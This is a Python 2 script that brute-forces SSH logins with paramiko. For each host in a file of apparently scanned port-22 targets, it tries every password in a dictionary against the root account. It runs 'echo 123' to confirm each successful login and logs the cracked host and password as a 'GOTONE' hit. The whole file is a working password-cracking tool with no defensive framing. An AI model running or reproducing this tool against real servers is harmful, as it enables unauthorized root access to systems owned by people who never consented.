#!/usr/bin/env python
# coding: utf-8

import sys, logging
import paramiko

#paramiko.util.log_to_file('connect.log')

class CConnectSSH():
	def connect(self, host, usr, pwd):
		client = None
		try:
			client = paramiko.SSHClient()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			client.connect(host, 22, username=usr, password=pwd, timeout=3, look_for_keys=False)
			stdin, stdout, stderr = client.exec_command('echo 123')
			if stdout.read() == '123\n':
				logging.warning('GOTONE > HOST: [' + host + '], PORT: [22], USER: [root], PASS: [' + pwd + ']')
			if client: client.close()
		except Exception, e:
			pass

if __name__ == '__main__':
	reload(sys)
	sys.setdefaultencoding('utf-8')

	logging.basicConfig(level=logging.WARNING, format='%(message)s', filename='result.log', filemode='a')
	console = logging.StreamHandler()
	console.setLevel(logging.INFO)
	console.setFormatter(logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s'))
	logging.getLogger('').addHandler(console)

	for host in open('22.snap.log', 'r'):
		print 'Beginning to crack', host.strip()
		for pwd in open('password.dict', 'r'):
			print '\tTrying password', pwd.strip()
			CConnectSSH().connect(host.strip(), 'root', pwd.strip())
